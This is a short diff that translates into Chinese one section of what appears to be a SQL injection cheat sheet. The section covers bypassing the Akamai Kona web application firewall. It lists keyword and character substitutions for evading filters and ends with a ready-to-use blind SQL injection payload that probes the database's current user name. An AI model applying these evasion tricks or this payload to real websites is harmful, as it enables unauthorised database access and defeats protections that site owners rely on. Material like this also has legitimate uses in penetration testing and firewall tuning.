@@ -2,13 +2,13 @@
 
 **Akamai Kona Bypass**
 
-* `MID` instead of `SUBSTRING`
-* `LIKE` instead of `=`
-* `/**/` instead of a `space`
-* `CURRENT_USER` instead of `CURRENT_USER()`
-* ` "` instead of `'`
+* `MID` 取代 `SUBSTRING`
+* `LIKE` 取代 `=`
+* `/**/` 取代 `space`
+* `CURRENT_USER` 取代 `CURRENT_USER()`
+* ` "` 取代 `'`
 
-Final example: 
+最终栗子： 
 
 ```sql
 444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
